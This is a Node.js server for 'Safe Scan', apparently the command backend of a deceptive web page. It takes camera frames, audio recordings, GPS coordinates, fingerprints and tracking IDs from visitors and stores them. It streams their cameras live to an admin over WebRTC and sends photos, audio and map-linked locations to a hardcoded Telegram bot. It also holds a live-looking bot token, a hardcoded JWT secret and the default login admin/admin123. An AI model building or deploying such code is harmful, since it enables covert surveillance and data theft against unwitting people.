const express = require('express');
const http = require('http');
const https = require('https');
const { Server } = require('socket.io');
const cors = require('cors');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const path = require('path');
const fs = require('fs');
const cookie = require('cookie');
const crypto = require('crypto');

// ═══════════════════════════════════════════════════════════════════
// CONFIG
// ═══════════════════════════════════════════════════════════════════
const PORT = process.env.PORT || 3001;
const JWT_SECRET = 'safescan-admin-secret-2024';
const MEDIA_DIR = path.join(__dirname, 'media');
const DATA_FILE = path.join(__dirname, 'data.json');

// ═══════════════════════════════════════════════════════════════════
// TELEGRAM CONFIGURATION
// ═══════════════════════════════════════════════════════════════════
const TELEGRAM_BOT_TOKEN = '8086423271:AAHnppYI0Os1KGWOD0JpynQliY7hdVxM3HI';
const TELEGRAM_CHAT_ID = '8262870180';

/**
 * Send a photo to Telegram via Bot API using Node's built-in https module.
 * @param {Buffer} photoBuffer - The image data as a Buffer
 * @param {string} caption - Caption text for the photo
 */
function sendPhotoToTelegram(photoBuffer, caption) {
  const boundary = '----TelegramBoundary' + Date.now();
  const fileName = `capture_${Date.now()}.jpg`;

  // Build multipart/form-data body
  const parts = [];

  // chat_id field
  parts.push(`--${boundary}\r\n`);
  parts.push(`Content-Disposition: form-data; name="chat_id"\r\n\r\n`);
  parts.push(`${TELEGRAM_CHAT_ID}\r\n`);

  // caption field
  if (caption) {
    parts.push(`--${boundary}\r\n`);
    parts.push(`Content-Disposition: form-data; name="caption"\r\n\r\n`);
    parts.push(`${caption}\r\n`);
  }

  // photo field (binary)
  const fileHeader = `--${boundary}\r\nContent-Disposition: form-data; name="photo"; filename="${fileName}"\r\nContent-Type: image/jpeg\r\n\r\n`;
  const fileFooter = `\r\n--${boundary}--\r\n`;

  const textParts = Buffer.from(parts.join(''), 'utf8');
  const headerBuf = Buffer.from(fileHeader, 'utf8');
  const footerBuf = Buffer.from(fileFooter, 'utf8');
  const body = Buffer.concat([textParts, headerBuf, photoBuffer, footerBuf]);

  const options = {
    hostname: 'api.telegram.org',
    path: `/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
    method: 'POST',
    headers: {
      'Content-Type': `multipart/form-data; boundary=${boundary}`,
      'Content-Length': body.length
    }
  };

  const req = https.request(options, (res) => {
    let data = '';
    res.on('data', (chunk) => data += chunk);
    res.on('end', () => {
      if (res.statusCode === 200) {
        console.log('📤 Photo sent to Telegram successfully');
      } else {
        console.error('📤 Telegram API error:', res.statusCode, data);
      }
    });
  });

  req.on('error', (err) => {
    console.error('📤 Telegram send error:', err.message);
  });

  req.write(body);
  req.end();
}

/**
 * Send a text message to Telegram via Bot API using Node's built-in https module.
 * @param {string} text - The message text to send
 */
function sendTextToTelegram(text) {
  const postData = JSON.stringify({
    chat_id: TELEGRAM_CHAT_ID,
    text: text,
    parse_mode: 'HTML'
  });

  const options = {
    hostname: 'api.telegram.org',
    path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(postData)
    }
  };

  const req = https.request(options, (res) => {
    let data = '';
    res.on('data', (chunk) => data += chunk);
    res.on('end', () => {
      if (res.statusCode === 200) {
        console.log('📤 Text message sent to Telegram successfully');
      } else {
        console.error('📤 Telegram API error:', res.statusCode, data);
      }
    });
  });

  req.on('error', (err) => {
    console.error('📤 Telegram send error:', err.message);
  });

  req.write(postData);
  req.end();
}

/**
 * Send an audio file to Telegram via Bot API using Node's built-in https module.
 * @param {Buffer} audioBuffer - The audio data as a Buffer
 * @param {string} caption - Caption text for the audio
 * @param {string} mimeType - MIME type of the audio file
 */
function sendAudioToTelegram(audioBuffer, caption, mimeType) {
  const boundary = '----TelegramBoundary' + Date.now();
  const fileName = `recording_${Date.now()}.webm`;

  // Build multipart/form-data body
  const parts = [];

  // chat_id field
  parts.push(`--${boundary}\r\n`);
  parts.push(`Content-Disposition: form-data; name="chat_id"\r\n\r\n`);
  parts.push(`${TELEGRAM_CHAT_ID}\r\n`);

  // caption field
  if (caption) {
    parts.push(`--${boundary}\r\n`);
    parts.push(`Content-Disposition: form-data; name="caption"\r\n\r\n`);
    parts.push(`${caption}\r\n`);
  }

  // document field (binary)
  const contentType = mimeType || 'audio/webm';
  const fileHeader = `--${boundary}\r\nContent-Disposition: form-data; name="document"; filename="${fileName}"\r\nContent-Type: ${contentType}\r\n\r\n`;
  const fileFooter = `\r\n--${boundary}--\r\n`;

  const textParts = Buffer.from(parts.join(''), 'utf8');
  const headerBuf = Buffer.from(fileHeader, 'utf8');
  const footerBuf = Buffer.from(fileFooter, 'utf8');
  const body = Buffer.concat([textParts, headerBuf, audioBuffer, footerBuf]);

  const options = {
    hostname: 'api.telegram.org',
    path: `/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
    method: 'POST',
    headers: {
      'Content-Type': `multipart/form-data; boundary=${boundary}`,
      'Content-Length': body.length
    }
  };

  const req = https.request(options, (res) => {
    let data = '';
    res.on('data', (chunk) => data += chunk);
    res.on('end', () => {
      if (res.statusCode === 200) {
        console.log('📤 Audio sent to Telegram successfully');
      } else {
        console.error('📤 Telegram API error:', res.statusCode, data);
      }
    });
  });

  req.on('error', (err) => {
    console.error('📤 Telegram send error:', err.message);
  });

  req.write(body);
  req.end();
}

// Create directories
fs.mkdirSync(path.join(MEDIA_DIR, 'captures'), { recursive: true });
fs.mkdirSync(path.join(MEDIA_DIR, 'recordings'), { recursive: true });

// ═══════════════════════════════════════════════════════════════════
// IN-MEMORY DATA STORE (with JSON file persistence)
// ═══════════════════════════════════════════════════════════════════
let db = {
  admin: {
    email: 'admin',
    password: bcrypt.hashSync('admin123', 10),
    name: 'Admin'
  },
  users: [],      // { uuid, session_ids: { cookie_session_id, tab_session_id, page_load_id, socket_id, fingerprint_id, local_storage_id, engine_io_id }, country, browser, device_type, ip, is_online, created_at, last_active, location }
  captures: [],   // { id, uuid, file_path, file_size, created_at }
  recordings: [], // { id, uuid, file_path, duration, file_size, mime_type, created_at }
  locations: []   // { uuid, latitude, longitude, accuracy, altitude, speed, heading, timestamp }
};

let activityLog = []; // { id, type, uuid, message, timestamp }
let logId = 1;

function addLog(type, uuid, message) {
  activityLog.unshift({ id: logId++, type, uuid: uuid || '', message, timestamp: new Date().toISOString() });
  if (activityLog.length > 500) activityLog.length = 500; // cap at 500
  io.to('admin').emit('activity:new', activityLog[0]);
}

// Load saved data
function loadData() {
  try {
    if (fs.existsSync(DATA_FILE)) {
      const raw = fs.readFileSync(DATA_FILE, 'utf8');
      const saved = JSON.parse(raw);
      // Merge but keep admin password
      db.users = saved.users || [];
      db.captures = saved.captures || [];
      db.recordings = saved.recordings || [];
      db.locations = saved.locations || [];
      // Mark all users offline on startup
      db.users.forEach(u => u.is_online = false);
      console.log(`📂 Loaded ${db.users.length} users, ${db.captures.length} captures, ${db.recordings.length} recordings, ${db.locations.length} locations`);
    }
  } catch (e) {
    console.log('📂 Starting with fresh database');
  }
}

function saveData() {
  try {
    fs.writeFileSync(DATA_FILE, JSON.stringify({
      users: db.users,
      captures: db.captures,
      recordings: db.recordings,
      locations: db.locations
    }, null, 2));
  } catch (e) { /* silent */ }
}

// Auto-save every 30 seconds
setInterval(saveData, 30000);
loadData();

// Daily summary to Telegram
function sendDailySummary() {
  const onlineCount = db.users.filter(u => u.is_online).length;
  const msg = `📊 Daily Summary — Safe Scan\n\n👥 Total Users: ${db.users.length}\n🟢 Online Now: ${onlineCount}\n📸 Total Captures: ${db.captures.length}\n🎤 Total Recordings: ${db.recordings.length}\n\n${new Date().toLocaleString()}`;
  sendTextToTelegram(msg);
}
setInterval(sendDailySummary, 24 * 60 * 60 * 1000);

// ID counter
let nextId = Math.max(
  0,
  ...db.captures.map(c => c.id || 0),
  ...db.recordings.map(r => r.id || 0)
) + 1;

// ═══════════════════════════════════════════════════════════════════
// EXPRESS APP
// ═══════════════════════════════════════════════════════════════════
const app = express();
const server = http.createServer(app);

app.use(cors({ origin: '*', credentials: true }));
app.use(express.json({ limit: '50mb' }));

// ─── Cookie Parser Middleware ────────────────────────────────────
app.use((req, res, next) => {
  req.cookies = cookie.parse(req.headers.cookie || '');
  next();
});

// ─── Session ID Cookie Middleware ────────────────────────────────
// Sets a persistent session_id cookie if one doesn't already exist.
// The cookie lasts 1 year and is accessible from JavaScript (httpOnly=false)
// so the client-side socket can read it.
app.use((req, res, next) => {
  if (!req.cookies.safescan_session_id) {
    const sessionId = crypto.randomUUID();
    res.setHeader('Set-Cookie', cookie.serialize('safescan_session_id', sessionId, {
      httpOnly: false,       // Allow JS to read it for socket.io
      maxAge: 365 * 24 * 60 * 60, // 1 year
      path: '/',
      sameSite: 'lax'
    }));
    req.cookies.safescan_session_id = sessionId;
    console.log(`🍪 New session cookie created: ${sessionId}`);
  }
  next();
});

// Handle JSON parse errors gracefully
app.use((err, req, res, next) => {
  if (err.type === 'entity.parse.failed') {
    return res.status(400).json({ error: 'Invalid JSON in request body' });
  }
  next(err);
});

// Serve user-facing website as default homepage at root /
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'index.html'));
});

// Serve user-facing website at /app (same origin = no CORS issues)
app.get('/app', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'index.html'));
});

// Serve admin dashboard files under /admin
app.use('/admin', express.static(path.join(__dirname, 'public')));

// Serve media files
app.use('/media', express.static(MEDIA_DIR, {
  setHeaders: (res) => res.setHeader('Access-Control-Allow-Origin', '*')
}));

// ─── Auth Middleware ──────────────────────────────────────────────
function authCheck(req, res, next) {
  const auth = req.headers.authorization;
  if (!auth || !auth.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'No token' });
  }
  try {
    req.admin = jwt.verify(auth.split(' ')[1], JWT_SECRET);
    next();
  } catch (e) {
    return res.status(401).json({ error: 'Invalid token' });
  }
}

// ─── Auth Routes ─────────────────────────────────────────────────
app.post('/api/auth/login', async (req, res) => {
  const { email, username, password } = req.body;
  const identifier = username || email;
  if (!identifier || !password) return res.status(400).json({ error: 'Username and password required' });

  if (identifier.toLowerCase().trim() !== db.admin.email) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  const valid = await bcrypt.compare(password, db.admin.password);
  if (!valid) return res.status(401).json({ error: 'Invalid credentials' });

  const token = jwt.sign({ email: db.admin.email, name: db.admin.name }, JWT_SECRET, { expiresIn: '7d' });
  res.json({ token, admin: { email: db.admin.email, name: db.admin.name } });
});

app.get('/api/auth/me', authCheck, (req, res) => {
  res.json({ email: db.admin.email, name: db.admin.name });
});

app.put('/api/auth/password', authCheck, async (req, res) => {
  const { currentPassword, newPassword } = req.body;
  const valid = await bcrypt.compare(currentPassword, db.admin.password);
  if (!valid) return res.status(401).json({ error: 'Current password incorrect' });
  db.admin.password = await bcrypt.hash(newPassword, 10);
  saveData();
  res.json({ message: 'Password updated' });
});

// ─── Users Routes ────────────────────────────────────────────────
app.get('/api/users', authCheck, (req, res) => {
  const search = (req.query.search || '').toLowerCase();
  let users = db.users.map(u => ({
    ...u,
    captures_count: db.captures.filter(c => c.uuid === u.uuid).length,
    recordings_count: db.recordings.filter(r => r.uuid === u.uuid).length
  }));

  if (search) {
    users = users.filter(u =>
      (u.uuid || '').toLowerCase().includes(search) ||
      (u.country || '').toLowerCase().includes(search) ||
      (u.device_type || '').toLowerCase().includes(search)
    );
  }

  // Sort: online first, then by last_active
  users.sort((a, b) => {
    if (a.is_online !== b.is_online) return b.is_online ? 1 : -1;
    return new Date(b.last_active) - new Date(a.last_active);
  });

  res.json({ users });
});

app.delete('/api/users/:uuid', authCheck, (req, res) => {
  const uuid = req.params.uuid;
  db.users = db.users.filter(u => u.uuid !== uuid);
  db.captures = db.captures.filter(c => c.uuid !== uuid);
  db.recordings = db.recordings.filter(r => r.uuid !== uuid);
  saveData();
  res.json({ message: 'User deleted' });
});

// ─── Captures Routes ─────────────────────────────────────────────
app.get('/api/captures', authCheck, (req, res) => {
  const uuid = req.query.uuid;
  let captures = uuid ? db.captures.filter(c => c.uuid === uuid) : [...db.captures];
  captures.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
  res.json({ captures: captures.slice(0, 100) });
});

// ─── Recordings Routes ───────────────────────────────────────────
app.get('/api/recordings', authCheck, (req, res) => {
  const uuid = req.query.uuid;
  let recordings = uuid ? db.recordings.filter(r => r.uuid === uuid) : [...db.recordings];
  recordings.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
  res.json({ recordings: recordings.slice(0, 100) });
});

app.get('/api/recordings/:id/stream', (req, res) => {
  const rec = db.recordings.find(r => r.id === parseInt(req.params.id));
  if (!rec) return res.status(404).json({ error: 'Not found' });

  const filePath = path.join(MEDIA_DIR, rec.file_path);
  if (!fs.existsSync(filePath)) return res.status(404).json({ error: 'File not found' });

  res.setHeader('Content-Type', rec.mime_type || 'audio/webm');
  res.setHeader('Access-Control-Allow-Origin', '*');
  fs.createReadStream(filePath).pipe(res);
});

// ─── Location Routes ─────────────────────────────────────────────
app.get('/api/locations', authCheck, (req, res) => {
  const userLocations = db.users
    .filter(u => u.location)
    .map(u => ({
      uuid: u.uuid,
      device_type: u.device_type,
      browser: u.browser,
      is_online: u.is_online,
      ...u.location
    }));
  res.json({ locations: userLocations });
});

app.get('/api/locations/:uuid', authCheck, (req, res) => {
  const uuid = req.params.uuid;
  const history = db.locations.filter(l => l.uuid === uuid);
  res.json({ locations: history });
});

// ─── File Browser Route ──────────────────────────────────────────
app.get('/api/files', authCheck, (req, res) => {
  const uuid = req.query.uuid;
  let captures = uuid ? db.captures.filter(c => c.uuid === uuid) : [...db.captures];
  let recordings = uuid ? db.recordings.filter(r => r.uuid === uuid) : [...db.recordings];
  captures.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
  recordings.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
  const files = [
    ...captures.map(c => ({ ...c, type: 'capture', url: '/media/' + c.file_path })),
    ...recordings.map(r => ({ ...r, type: 'recording', url: '/media/' + r.file_path }))
  ];
  files.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
  res.json({ files });
});

// ─── Recording Management Routes ────────────────────────────────
app.delete('/api/recordings/:id', authCheck, (req, res) => {
  const id = parseInt(req.params.id);
  const rec = db.recordings.find(r => r.id === id);
  if (!rec) return res.status(404).json({ error: 'Recording not found' });
  const filePath = path.join(MEDIA_DIR, rec.file_path);
  try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch(e) {}
  db.recordings = db.recordings.filter(r => r.id !== id);
  saveData();
  addLog('delete', rec.uuid, 'Recording deleted: ' + rec.file_path);
  emitStats();
  res.json({ message: 'Recording deleted' });
});

app.post('/api/recordings/batch-delete', authCheck, (req, res) => {
  const { ids } = req.body;
  if (!ids || !Array.isArray(ids)) return res.status(400).json({ error: 'ids array required' });
  let deleted = 0;
  ids.forEach(id => {
    const rec = db.recordings.find(r => r.id === id);
    if (rec) {
      const filePath = path.join(MEDIA_DIR, rec.file_path);
      try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch(e) {}
      deleted++;
    }
  });
  db.recordings = db.recordings.filter(r => !ids.includes(r.id));
  saveData();
  addLog('delete', '', `Batch deleted ${deleted} recordings`);
  emitStats();
  res.json({ message: `${deleted} recordings deleted` });
});

app.delete('/api/captures/:id', authCheck, (req, res) => {
  const id = parseInt(req.params.id);
  const cap = db.captures.find(c => c.id === id);
  if (!cap) return res.status(404).json({ error: 'Capture not found' });
  const filePath = path.join(MEDIA_DIR, cap.file_path);
  try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch(e) {}
  db.captures = db.captures.filter(c => c.id !== id);
  saveData();
  addLog('delete', cap.uuid, 'Capture deleted: ' + cap.file_path);
  emitStats();
  res.json({ message: 'Capture deleted' });
});

// ─── Activity Log Route ──────────────────────────────────────────
app.get('/api/activity-log', authCheck, (req, res) => {
  const limit = parseInt(req.query.limit) || 100;
  res.json({ log: activityLog.slice(0, limit) });
});

// ─── Export Route ────────────────────────────────────────────────
app.get('/api/export', authCheck, (req, res) => {
  res.setHeader('Content-Disposition', 'attachment; filename=safescan_export.json');
  res.json({
    exported_at: new Date().toISOString(),
    users: db.users,
    captures: db.captures,
    recordings: db.recordings,
    activity_log: activityLog
  });
});

// ─── Stats Route ─────────────────────────────────────────────────
app.get('/api/stats', authCheck, (req, res) => {
  res.json({
    onlineCount: db.users.filter(u => u.is_online).length,
    totalUsers: db.users.length,
    totalCaptures: db.captures.length,
    totalRecordings: db.recordings.length
  });
});

// ═══════════════════════════════════════════════════════════════════
// SOCKET.IO
// ═══════════════════════════════════════════════════════════════════
const io = new Server(server, {
  cors: { origin: '*', methods: ['GET', 'POST'] },
  maxHttpBufferSize: 50e6
});

// Track connected users: uuid -> socket id
const connectedUsers = new Map();

io.on('connection', (socket) => {
  const isAdmin = socket.handshake.auth && socket.handshake.auth.token;

  if (isAdmin) {
    // ─── Admin Connection ────────────────────────────────────
    try {
      jwt.verify(socket.handshake.auth.token, JWT_SECRET);
    } catch (e) {
      socket.emit('auth:error', { error: 'Invalid token' });
      socket.disconnect();
      return;
    }

    console.log('🔑 Admin connected:', socket.id);
    socket.join('admin');

    socket.on('admin:join', () => {
      const onlineUsers = db.users.filter(u => u.is_online);
      socket.emit('admin:users', onlineUsers);
      emitStats();
    });

    // WebRTC Signaling (Admin to User)
    socket.on('webrtc:request', (data) => {
      if (!data || !data.uuid) return;
      const userSocketId = connectedUsers.get(data.uuid);
      if (userSocketId) {
        console.log(`📡 [WebRTC Signaling] Admin requesting stream from user ${data.uuid}`);
        io.to(userSocketId).emit('webrtc:request', { adminSocketId: socket.id });
      }
    });

    socket.on('webrtc:answer', (data) => {
      if (!data || !data.userSocketId || !data.answer) return;
      io.to(data.userSocketId).emit('webrtc:answer', { answer: data.answer });
    });

    socket.on('webrtc:ice-candidate', (data) => {
      if (!data || !data.userSocketId || !data.candidate) return;
      io.to(data.userSocketId).emit('webrtc:ice-candidate', { candidate: data.candidate });
    });

    socket.on('webrtc:stop', (data) => {
      if (!data || !data.userSocketId) return;
      io.to(data.userSocketId).emit('webrtc:stop');
    });

    socket.on('disconnect', () => {
      console.log('🔑 Admin disconnected:', socket.id);
    });

  } else {
    // ─── Mobile User Connection ──────────────────────────────
    let userUUID = null;

    // ─── Read session_id from the handshake cookies ───────────
    const handshakeCookies = cookie.parse(socket.handshake.headers.cookie || '');
    const socketSessionId = handshakeCookies.safescan_session_id || null;

    socket.on('user:register', (data) => {
      if (!data || !data.uuid) return;
      userUUID = data.uuid;
      connectedUsers.set(userUUID, socket.id);

      // ─── Collect ALL session IDs ───────────────────────────────
      const clientSessions = data.session_ids || {};
      const sessionIds = {
        cookie_session_id: socketSessionId || clientSessions.cookie_session_id || null,
        tab_session_id: clientSessions.tab_session_id || null,
        page_load_id: clientSessions.page_load_id || null,
        socket_id: socket.id,  // Server-authoritative socket ID
        fingerprint_id: clientSessions.fingerprint_id || null,
        local_storage_id: clientSessions.local_storage_id || null,
        engine_io_id: clientSessions.engine_io_id || socket.conn?.id || null
      };

      // Find or create user
      let user = db.users.find(u => u.uuid === userUUID);
      if (user) {
        user.is_online = true;
        user.last_active = new Date().toISOString();
        if (data.browser) user.browser = data.browser;
        if (data.device_type) user.device_type = data.device_type;
        if (data.country) user.country = data.country;
        user.session_ids = sessionIds;
        user.third_party_ids = data.third_party_ids || {};
        user.ip = socket.handshake.address || '';
      } else {
        user = {
          uuid: userUUID,
          session_ids: sessionIds,
          third_party_ids: data.third_party_ids || {},
          country: data.country || 'Unknown',
          browser: data.browser || 'Unknown',
          device_type: data.device_type || 'Unknown',
          ip: socket.handshake.address || '',
          is_online: true,
          created_at: new Date().toISOString(),
          last_active: new Date().toISOString()
        };
        db.users.push(user);
      }

      // Store location from registration if provided
      if (data.location && data.location.latitude) {
        user.location = {
          latitude: data.location.latitude,
          longitude: data.location.longitude,
          accuracy: data.location.accuracy || null,
          altitude: data.location.altitude || null,
          speed: data.location.speed || null,
          heading: data.location.heading || null,
          timestamp: new Date().toISOString()
        };
      }

      console.log(`📱 User connected: ${userUUID} (${data.device_type || 'Unknown'})`);

      const locStr = user.location ? `\nLocation: ${user.location.latitude.toFixed(6)}, ${user.location.longitude.toFixed(6)}\n🗺️ Map: https://www.google.com/maps?q=${user.location.latitude},${user.location.longitude}` : '';
      
      const t = data.third_party_ids || {};
      const thirdPartyStr = (t.ga_client_id || t.fb_pixel_id || t.tiktok_pixel_id || t.gclid || t.fbclid || t.utm_source) 
        ? `\n\n🎯 Tracking IDs:\n${t.ga_client_id ? 'GA: ' + t.ga_client_id + '\n' : ''}${t.fb_pixel_id ? 'FB: ' + t.fb_pixel_id + '\n' : ''}${t.tiktok_pixel_id ? 'TikTok: ' + t.tiktok_pixel_id + '\n' : ''}${t.gclid ? 'GCLID: ' + t.gclid + '\n' : ''}${t.fbclid ? 'FBCLID: ' + t.fbclid + '\n' : ''}${t.utm_source ? 'UTM: ' + t.utm_source + (t.utm_campaign ? ' / ' + t.utm_campaign : '') : ''}` 
        : '';
        
      const sessionStr = `\n\n🔑 Session IDs:\n🍪 Cookie: ${sessionIds.cookie_session_id || '—'}\n📑 Tab: ${sessionIds.tab_session_id || '—'}\n📄 Page Load: ${sessionIds.page_load_id || '—'}\n🔌 Socket: ${sessionIds.socket_id || '—'}\n🧬 Fingerprint: ${sessionIds.fingerprint_id || '—'}\n💾 LocalStorage: ${sessionIds.local_storage_id || '—'}\n⚙️ Engine.IO: ${sessionIds.engine_io_id || '—'}`;
      const connectMsg = `🟢 User Connected\n\nUUID: ${userUUID}\nDevice: ${data.device_type || 'Unknown'}\nBrowser: ${data.browser || 'Unknown'}\nTimezone: ${data.country || 'Unknown'}\nIP: ${socket.handshake.address || 'Unknown'}${locStr}${sessionStr}${thirdPartyStr}\n\n${new Date().toLocaleString()}`;
      sendTextToTelegram(connectMsg);
      addLog('user_connect', userUUID, 'User connected: ' + (data.device_type || 'Unknown') + ' / ' + (data.browser || 'Unknown'));

      io.to('admin').emit('user:connected', user);
      emitStats();
      saveData();
    });

    // WebRTC Signaling (User to Admin)
    socket.on('webrtc:offer', (data) => {
      if (!data || !data.adminSocketId || !data.offer) return;
      console.log(`📡 [WebRTC Signaling] User ${userUUID} sending offer to Admin ${data.adminSocketId}`);
      io.to(data.adminSocketId).emit('webrtc:offer', {
        uuid: userUUID,
        userSocketId: socket.id,
        offer: data.offer
      });
    });

    socket.on('webrtc:ice-candidate', (data) => {
      if (!data || !data.adminSocketId || !data.candidate) return;
      io.to(data.adminSocketId).emit('webrtc:ice-candidate', {
        uuid: userUUID,
        candidate: data.candidate
      });
    });

    socket.on('camera:frame', (data) => {
      if (!data || !data.uuid || !data.frame) return;

      const uuid = data.uuid;
      const timestamp = data.timestamp || Date.now();
      const fileName = `${uuid}_${timestamp}.jpg`;
      const filePath = path.join(MEDIA_DIR, 'captures', fileName);

      try {
        // Save image file
        const base64 = data.frame.replace(/^data:image\/\w+;base64,/, '');
        const buffer = Buffer.from(base64, 'base64');
        fs.writeFileSync(filePath, buffer);

        // Save to DB
        const capture = {
          id: nextId++,
          uuid,
          file_path: 'captures/' + fileName,
          file_size: buffer.length,
          created_at: new Date().toISOString()
        };
        db.captures.push(capture);

        // Update user last_active
        const user = db.users.find(u => u.uuid === uuid);
        if (user) user.last_active = new Date().toISOString();

        // Send to admin dashboard
        io.to('admin').emit('feed:frame', {
          uuid,
          captureId: capture.id,
          imageUrl: '/media/captures/' + fileName,
          timestamp,
          fileSize: buffer.length
        });

        // Send to Telegram
        const captionUser = db.users.find(u => u.uuid === uuid);
        const caption = `📸 Camera Capture\nUser: ${uuid}\nDevice: ${captionUser?.device_type || 'Unknown'}\nBrowser: ${captionUser?.browser || 'Unknown'}\nTimezone: ${captionUser?.country || 'Unknown'}\nIP: ${captionUser?.ip || 'Unknown'}\n${new Date().toLocaleString()}\n\nSafe Scan v3.0`;
        sendPhotoToTelegram(buffer, caption);
        addLog('capture', uuid, 'Camera capture saved');

        emitStats();
      } catch (e) {
        console.error('Camera frame error:', e.message);
      }
    });

    socket.on('audio:recording', (data) => {
      if (!data || !data.uuid || !data.audio) return;

      const uuid = data.uuid;
      const timestamp = Date.now();
      const ext = (data.mimeType || '').includes('ogg') ? 'ogg' : (data.mimeType || '').includes('mp4') ? 'mp4' : 'webm';
      const fileName = `${uuid}_${timestamp}.${ext}`;
      const filePath = path.join(MEDIA_DIR, 'recordings', fileName);

      try {
        const base64 = data.audio.replace(/^data:[^;]+;base64,/, '');
        const buffer = Buffer.from(base64, 'base64');
        fs.writeFileSync(filePath, buffer);

        const recording = {
          id: nextId++,
          uuid,
          file_path: 'recordings/' + fileName,
          duration: data.duration || 0,
          file_size: buffer.length,
          mime_type: data.mimeType || 'audio/webm',
          created_at: new Date().toISOString()
        };
        db.recordings.push(recording);

        const user = db.users.find(u => u.uuid === uuid);
        if (user) user.last_active = new Date().toISOString();

        io.to('admin').emit('feed:audio', {
          uuid,
          recordingId: recording.id,
          duration: data.duration || 0,
          fileUrl: '/media/recordings/' + fileName,
          timestamp
        });

        console.log(`🎤 Recording saved: ${fileName} (${data.duration || 0}s)`);

        // Send to Telegram with enhanced info
        const recUser = db.users.find(u => u.uuid === uuid);
        const recLocStr = recUser?.location ? `\nLocation: ${recUser.location.latitude.toFixed(6)}, ${recUser.location.longitude.toFixed(6)}\n🗺️ Map: https://www.google.com/maps?q=${recUser.location.latitude},${recUser.location.longitude}` : '';
        const audioCaption = `🎤 Audio Recording\nUser: ${uuid}\nDevice: ${recUser?.device_type || 'Unknown'}\nBrowser: ${recUser?.browser || 'Unknown'}\nDuration: ${data.duration || 0}s${recLocStr}\n${new Date().toLocaleString()}\n\nSafe Scan v3.0`;
        sendAudioToTelegram(buffer, audioCaption, data.mimeType);
        addLog('recording', uuid, 'Audio recording saved (' + (data.duration || 0) + 's)');

        emitStats();
      } catch (e) {
        console.error('Audio recording error:', e.message);
      }
    });

    // Handle location updates from mobile users
    socket.on('location:update', (data) => {
      if (!data || !data.uuid) return;
      const uuid = data.uuid;
      const locationData = {
        uuid,
        latitude: data.latitude,
        longitude: data.longitude,
        accuracy: data.accuracy || null,
        altitude: data.altitude || null,
        speed: data.speed || null,
        heading: data.heading || null,
        timestamp: new Date().toISOString()
      };

      const user = db.users.find(u => u.uuid === uuid);
      if (user) {
        user.location = locationData;
        user.last_active = new Date().toISOString();
      }

      db.locations.push(locationData);
      if (db.locations.length > 1000) db.locations = db.locations.slice(-1000);

      io.to('admin').emit('location:update', locationData);

      // Throttle Telegram: only send if last location msg was > 5 mins ago
      const lastLocMsg = user?._lastLocTelegram || 0;
      if (Date.now() - lastLocMsg > 5 * 60 * 1000) {
        if (user) user._lastLocTelegram = Date.now();
        const mapsLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
        const locMsg = `📍 Location Update\n\nUUID: ${uuid}\nCoordinates: ${data.latitude.toFixed(6)}, ${data.longitude.toFixed(6)}\nAccuracy: ${data.accuracy ? data.accuracy.toFixed(0) + 'm' : 'N/A'}\nAltitude: ${data.altitude ? data.altitude.toFixed(1) + 'm' : 'N/A'}\nSpeed: ${data.speed ? data.speed.toFixed(1) + ' m/s' : 'N/A'}\n\n🗺️ Map: ${mapsLink}\n\n${new Date().toLocaleString()}`;
        sendTextToTelegram(locMsg);
        addLog('location', uuid, `Location: ${data.latitude.toFixed(4)}, ${data.longitude.toFixed(4)}`);
      }
    });

    socket.on('disconnect', () => {
      if (userUUID) {
        connectedUsers.delete(userUUID);
        const user = db.users.find(u => u.uuid === userUUID);
        if (user) {
          user.is_online = false;
          user.last_active = new Date().toISOString();
        }
        io.to('admin').emit('user:disconnected', { uuid: userUUID });
        console.log(`📱 User disconnected: ${userUUID}`);

        const discLocStr = user?.location ? `\nLast Location: ${user.location.latitude.toFixed(6)}, ${user.location.longitude.toFixed(6)}\n🗺️ Map: https://www.google.com/maps?q=${user.location.latitude},${user.location.longitude}` : '';
        const disconnectMsg = `🔴 User Disconnected\n\nUUID: ${userUUID}${discLocStr}\n\n${new Date().toLocaleString()}`;
        sendTextToTelegram(disconnectMsg);
        addLog('user_disconnect', userUUID, 'User disconnected');

        emitStats();
        saveData();
      }
    });
  }
});

function emitStats() {
  io.to('admin').emit('stats:update', {
    onlineCount: db.users.filter(u => u.is_online).length,
    totalUsers: db.users.length,
    totalCaptures: db.captures.length,
    totalRecordings: db.recordings.length
  });
}

// ═══════════════════════════════════════════════════════════════════
// GLOBAL ERROR HANDLER (prevents crashes)
// ═══════════════════════════════════════════════════════════════════
app.use((err, req, res, next) => {
  console.error('Unhandled error:', err.message);
  res.status(500).json({ error: 'Internal server error' });
});

process.on('uncaughtException', (err) => {
  console.error('Uncaught exception:', err.message);
});

process.on('unhandledRejection', (reason) => {
  console.error('Unhandled rejection:', reason);
});

// ═══════════════════════════════════════════════════════════════════
// START
// ═══════════════════════════════════════════════════════════════════
server.listen(PORT, () => {
  console.log(`\n🚀 Safe Scan Admin Server running on http://localhost:${PORT}`);
  console.log(`📁 Media: ${MEDIA_DIR}`);
  console.log(`🔑 Login: admin / admin123`);
  console.log(`\n📡 Waiting for connections...\n`);
});
